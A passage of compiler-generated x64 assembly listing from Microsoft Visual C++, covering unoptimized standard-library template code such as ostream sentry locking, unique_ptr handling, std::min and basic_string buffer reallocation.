	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR tv72[rsp], rax
	mov	rax, QWORD PTR tv72[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR tv72[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf
	mov	QWORD PTR _Rdbuf$[rsp], rax

; 79   :             if (_Rdbuf) {

	cmp	QWORD PTR _Rdbuf$[rsp], 0
	je	SHORT $LN2@Sentry_bas

; 80   :                 _Rdbuf->_Unlock();

	mov	rax, QWORD PTR _Rdbuf$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Rdbuf$[rsp]
	call	QWORD PTR [rax+16]
	npad	1
$LN2@Sentry_bas:

; 81   :             }
; 82   :         }

	add	rsp, 56					; 00000038H
	ret	0
??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ ENDP ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Sentry_base::~_Sentry_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??0_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z
_TEXT	SEGMENT
_Rdbuf$ = 32
tv73 = 40
this$ = 64
_Ostr$ = 72
??0_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z PROC ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Sentry_base::_Sentry_base, COMDAT

; 70   :         __CLR_OR_THIS_CALL _Sentry_base(basic_ostream& _Ostr) : _Myostr(_Ostr) { // lock the stream buffer, if there

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	mov	QWORD PTR [rax], rcx

; 71   :             const auto _Rdbuf = _Myostr.rdbuf();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR tv73[rsp], rax
	mov	rax, QWORD PTR tv73[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR tv73[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf
	mov	QWORD PTR _Rdbuf$[rsp], rax

; 72   :             if (_Rdbuf) {

	cmp	QWORD PTR _Rdbuf$[rsp], 0
	je	SHORT $LN2@Sentry_bas

; 73   :                 _Rdbuf->_Lock();

	mov	rax, QWORD PTR _Rdbuf$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Rdbuf$[rsp]
	call	QWORD PTR [rax+8]
$LN2@Sentry_bas:

; 74   :             }
; 75   :         }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z ENDP ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Sentry_base::_Sentry_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\memory
;	COMDAT ??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@PEAV_Facet_base@1@@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 64
_Ptr$ = 72
??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@PEAV_Facet_base@1@@Z PROC ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>, COMDAT

; 3194 :     _CONSTEXPR23 explicit unique_ptr(pointer _Ptr) noexcept : _Mypair(_Zero_then_variadic_args_t{}, _Ptr) {}

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rax, QWORD PTR this$[rsp]
	lea	r8, QWORD PTR _Ptr$[rsp]
	movzx	edx, BYTE PTR $T1[rsp]
	mov	rcx, rax
	call	??$?0AEAPEAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@AEAPEAV_Facet_base@1@@Z ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1><std::_Facet_base * &>
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@PEAV_Facet_base@1@@Z ENDP ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAAAEAU?$default_delete@V_Facet_base@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAAAEAU?$default_delete@V_Facet_base@std@@@2@XZ PROC ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Get_first, COMDAT

; 1382 :     constexpr _Ty1& _Get_first() noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 1383 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 1384 :     }

	ret	0
?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAAAEAU?$default_delete@V_Facet_base@std@@@2@XZ ENDP ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\memory
;	COMDAT ?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAAPEAV_Facet_base@2@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAAPEAV_Facet_base@2@XZ PROC ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release, COMDAT

; 3280 :     _CONSTEXPR23 pointer release() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 3281 :         return _STD exchange(_Mypair._Myval2, nullptr);

	mov	QWORD PTR $T1[rsp], 0
	mov	rax, QWORD PTR this$[rsp]
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	??$exchange@PEAV_Facet_base@std@@$$T@std@@YAPEAV_Facet_base@0@AEAPEAV10@$$QEA$$T@Z ; std::exchange<std::_Facet_base *,std::nullptr_t>

; 3282 :     }

	add	rsp, 56					; 00000038H
	ret	0
?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAAPEAV_Facet_base@2@XZ ENDP ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\memory
;	COMDAT ??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ PROC ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >, COMDAT

; 3250 :     _CONSTEXPR23 ~unique_ptr() noexcept {

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 3251 :         if (_Mypair._Myval2) {

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN2@unique_ptr

; 3252 :             _Mypair._Get_first()(_Mypair._Myval2);

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAAAEAU?$default_delete@V_Facet_base@std@@@2@XZ ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Get_first
	mov	rcx, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rcx]
	mov	rcx, rax
	call	??R?$default_delete@V_Facet_base@std@@@std@@QEBAXPEAV_Facet_base@1@@Z ; std::default_delete<std::_Facet_base>::operator()
$LN2@unique_ptr:

; 3253 :         }
; 3254 :     }

	add	rsp, 40					; 00000028H
	ret	0
??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ ENDP ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\memory
;	COMDAT ??R?$default_delete@V_Facet_base@std@@@std@@QEBAXPEAV_Facet_base@1@@Z
_TEXT	SEGMENT
$T1 = 32
tv70 = 40
this$ = 64
_Ptr$ = 72
??R?$default_delete@V_Facet_base@std@@@std@@QEBAXPEAV_Facet_base@1@@Z PROC ; std::default_delete<std::_Facet_base>::operator(), COMDAT

; 3139 :     _CONSTEXPR23 void operator()(_Ty* _Ptr) const noexcept /* strengthened */ { // delete a pointer

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 3140 :         static_assert(0 < sizeof(_Ty), "can't delete an incomplete type");
; 3141 :         delete _Ptr;

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	QWORD PTR $T1[rsp], rax
	cmp	QWORD PTR $T1[rsp], 0
	je	SHORT $LN3@operator
	mov	rax, QWORD PTR $T1[rsp]
	mov	rax, QWORD PTR [rax]
	mov	edx, 1
	mov	rcx, QWORD PTR $T1[rsp]
	call	QWORD PTR [rax]
	mov	QWORD PTR tv70[rsp], rax
	jmp	SHORT $LN4@operator
$LN3@operator:
	mov	QWORD PTR tv70[rsp], 0
$LN4@operator:

; 3142 :     }

	add	rsp, 56					; 00000038H
	ret	0
??R?$default_delete@V_Facet_base@std@@@std@@QEBAXPEAV_Facet_base@1@@Z ENDP ; std::default_delete<std::_Facet_base>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\utility
;	COMDAT ??$min@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
tv65 = 0
$T1 = 8
_Left$ = 32
_Right$ = 40
??$min@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::min<unsigned __int64>, COMDAT

; 64   :     (min) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Right < _Left)) /* strengthened */ {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 65   :     // return smaller of _Left and _Right
; 66   :     return _Right < _Left ? _Right : _Left;

	mov	rax, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR _Left$[rsp]
	mov	rcx, QWORD PTR [rcx]
	cmp	QWORD PTR [rax], rcx
	jae	SHORT $LN3@min
	mov	rax, QWORD PTR _Right$[rsp]
	mov	QWORD PTR tv65[rsp], rax
	jmp	SHORT $LN4@min
$LN3@min:
	mov	rax, QWORD PTR _Left$[rsp]
	mov	QWORD PTR tv65[rsp], rax
$LN4@min:
	mov	rax, QWORD PTR tv65[rsp]
	mov	QWORD PTR $T1[rsp], rax
	mov	rax, QWORD PTR $T1[rsp]

; 67   : }

	add	rsp, 24
	ret	0
??$min@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::min<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Pocma@V?$allocator@D@std@@@std@@YAXAEAV?$allocator@D@0@0@Z
_TEXT	SEGMENT
_Left$ = 48
_Right$ = 56
??$_Pocma@V?$allocator@D@std@@@std@@YAXAEAV?$allocator@D@0@0@Z PROC ; std::_Pocma<std::allocator<char> >, COMDAT

; 928  : _CONSTEXPR20 void _Pocma(_Alloc& _Left, _Alloc& _Right) noexcept { // (maybe) propagate on container move assignment

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 929  :     if constexpr (allocator_traits<_Alloc>::propagate_on_container_move_assignment::value) {
; 930  :         _Left = _STD move(_Right);

	mov	rcx, QWORD PTR _Right$[rsp]
	call	??$move@AEAV?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z ; std::move<std::allocator<char> &>

; 931  :     }
; 932  : }

	add	rsp, 40					; 00000028H
	ret	0
??$_Pocma@V?$allocator@D@std@@@std@@YAXAEAV?$allocator@D@0@0@Z ENDP ; std::_Pocma<std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$addressof@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@YAPEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@AEAV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@YAPEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@AEAV10@@Z PROC ; std::addressof<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >, COMDAT

; 252  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 253  :     return __builtin_addressof(_Val);

	mov	rax, QWORD PTR _Val$[rsp]

; 254  : }

	ret	0
??$addressof@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@YAPEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@AEAV10@@Z ENDP ; std::addressof<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@Z
_TEXT	SEGMENT
_My_data$ = 48
_Old_size$ = 56
_New_ptr$ = 64
_New_size$ = 72
_New_capacity$ = 80
_Old_capacity$ = 88
_Old_ptr$1 = 96
_Al$ = 104
_Raw_new$ = 112
this$ = 144
_Size_increase$ = 152
_Fn$ = 160
<_Args_0>$ = 168
<_Args_1>$ = 176
??$_Reallocate_grow_by@V<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_e1befb086ad3257e3f042a63030725f7>,unsigned __int64,char>, COMDAT

; 4802 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

$LN6:
	mov	QWORD PTR [rsp+32], r9
	mov	BYTE PTR [rsp+24], r8b
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 136				; 00000088H

; 4803 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4804 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4805 :         auto& _My_data            = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 4806 :         const size_type _Old_size = _My_data._Mysize;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax+16]
	mov	QWORD PTR _Old_size$[rsp], rax

; 4807 :         if (max_size() - _Old_size < _Size_increase) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
	sub	rax, QWORD PTR _Old_size$[rsp]
	cmp	rax, QWORD PTR _Size_increase$[rsp]
	jae	SHORT $LN2@Reallocate

; 4808 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Reallocate:

; 4809 :         }
; 4810 : 
; 4811 :         const size_type _New_size     = _Old_size + _Size_increase;

	mov	rax, QWORD PTR _Size_increase$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _New_size$[rsp], rax

; 4812 :         const size_type _Old_capacity = _My_data._Myres;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR _Old_capacity$[rsp], rax

; 4813 :         const size_type _New_capacity = _Calculate_growth(_New_size);

	mov	rdx, QWORD PTR _New_size$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
	mov	QWORD PTR _New_capacity$[rsp], rax

; 4814 :         auto& _Al                     = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 4815 :         const pointer _New_ptr        = _Al.allocate(_New_capacity + 1); // throws

	mov	rax, QWORD PTR _New_capacity$[rsp]
	inc	rax
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@D@std@@QEAAPEAD_K@Z ; std::allocator<char>::allocate
	mov	QWORD PTR _New_ptr$[rsp], rax

; 4816 : 
; 4817 : #if _HAS_CXX20
; 4818 :         if (_STD is_constant_evaluated()) { // Begin the lifetimes of the objects before copying to avoid UB
; 4819 :             _Traits::assign(_Unfancy(_New_ptr), _New_capacity + 1, _Elem());
; 4820 :         }
; 4821 : #endif // _HAS_CXX20
; 4822 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4823 :         _ASAN_STRING_REMOVE(*this);
; 4824 :         _My_data._Mysize      = _New_size;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_size$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 4825 :         _My_data._Myres       = _New_capacity;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_capacity$[rsp]
	mov	QWORD PTR [rax+24], rcx

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	mov	QWORD PTR _Raw_new$[rsp], rax

; 4827 :         if (_BUF_SIZE <= _Old_capacity) {

	cmp	QWORD PTR _Old_capacity$[rsp], 16
	jb	SHORT $LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Old_ptr$1[rsp], rax

; 4829 :             _Fn(_Raw_new, _Unfancy(_Old_ptr), _Old_size, _Args...);

	mov	rcx, QWORD PTR _Old_ptr$1[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	movzx	ecx, BYTE PTR <_Args_1>$[rsp]
	mov	BYTE PTR [rsp+40], cl
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, QWORD PTR _Old_size$[rsp]
	mov	r8, rax
	mov	rdx, QWORD PTR _Raw_new$[rsp]
	lea	rcx, QWORD PTR _Fn$[rsp]
	call	??R<lambda_e1befb086ad3257e3f042a63030725f7>@@QEBA@QEADQEBD_K2D@Z ; <lambda_e1befb086ad3257e3f042a63030725f7>::operator()

; 4830 :             _Al.deallocate(_Old_ptr, _Old_capacity + 1);

	mov	rax, QWORD PTR _Old_capacity$[rsp]
	inc	rax
	mov	r8, rax
	mov	rdx, QWORD PTR _Old_ptr$1[rsp]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z ; std::allocator<char>::deallocate

; 4831 :             _My_data._Bx._Ptr = _New_ptr;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	mov	QWORD PTR [rax], rcx

; 4832 :         } else {

	jmp	SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);

	mov	rax, QWORD PTR _My_data$[rsp]
	movzx	ecx, BYTE PTR <_Args_1>$[rsp]
	mov	BYTE PTR [rsp+40], cl
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, QWORD PTR _Old_size$[rsp]
	mov	r8, rax
	mov	rdx, QWORD PTR _Raw_new$[rsp]
	lea	rcx, QWORD PTR _Fn$[rsp]
	call	??R<lambda_e1befb086ad3257e3f042a63030725f7>@@QEBA@QEADQEBD_K2D@Z ; <lambda_e1befb086ad3257e3f042a63030725f7>::operator()

; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	rax, QWORD PTR _My_data$[rsp]
	lea	rdx, QWORD PTR _New_ptr$[rsp]
	mov	rcx, rax
	call	??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z ; std::_Construct_in_place<char *,char * const &>
$LN4@Reallocate:

; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

	mov	rax, QWORD PTR this$[rsp]
$LN5@Reallocate:

; 4839 :     }

	add	rsp, 136				; 00000088H
	ret	0
??$_Reallocate_grow_by@V<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_e1befb086ad3257e3f042a63030725f7>,unsigned __int64,char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??R<lambda_e1befb086ad3257e3f042a63030725f7>@@QEBA@QEADQEBD_K2D@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 64
_New_ptr$ = 72
_Old_ptr$ = 80
_Old_size$ = 88
_Count$ = 96
_Ch$ = 104
??R<lambda_e1befb086ad3257e3f042a63030725f7>@@QEBA@QEADQEBD_K2D@Z PROC ; <lambda_e1befb086ad3257e3f042a63030725f7>::operator(), COMDAT

; 3407 :             },

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 3404 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);

	mov	r8, QWORD PTR _Old_size$[rsp]
	mov	rdx, QWORD PTR _Old_ptr$[rsp]
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::copy

; 3405 :                 _Traits::assign(_New_ptr + _Old_size, _Count, _Ch);

	mov	rax, QWORD PTR _Old_size$[rsp]
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movzx	r8d, BYTE PTR _Ch$[rsp]
	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z ; std::_Narrow_char_traits<char,int>::assign

; 3406 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());

	mov	BYTE PTR $T1[rsp], 0
	mov	rax, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 3407 :             },

	add	rsp, 56					; 00000038H
	ret	0
??R<lambda_e1befb086ad3257e3f042a63030725f7>@@QEBA@QEADQEBD_K2D@Z ENDP ; <lambda_e1befb086ad3257e3f042a63030725f7>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_b986da8d428e4af07c64af60eec09b61>@@_K_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_b986da8d428e4af07c64af60eec09b61>@@_K2D@Z
_TEXT	SEGMENT
_My_data$ = 64
_Old_size$ = 72
_New_ptr$ = 80
_New_size$ = 88
_New_capacity$ = 96
_Old_capacity$ = 104
_Old_ptr$1 = 112
_Al$ = 120
_Raw_new$ = 128
this$ = 160
_Size_increase$ = 168
_Fn$ = 176
<_Args_0>$ = 184
<_Args_1>$ = 192
<_Args_2>$ = 200
??$_Reallocate_grow_by@V<lambda_b986da8d428e4af07c64af60eec09b61>@@_K_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_b986da8d428e4af07c64af60eec09b61>@@_K2D@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_b986da8d428e4af07c64af60eec09b61>,unsigned __int64,unsigned __int64,char>, COMDAT

; 4802 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

$LN6:
	mov	QWORD PTR [rsp+32], r9
	mov	BYTE PTR [rsp+24], r8b
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 152				; 00000098H

; 4803 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4804 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4805 :         auto& _My_data            = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 4806 :         const size_type _Old_size = _My_data._Mysize;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax+16]
	mov	QWORD PTR _Old_size$[rsp], rax

; 4807 :         if (max_size() - _Old_size < _Size_increase) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
	sub	rax, QWORD PTR _Old_size$[rsp]
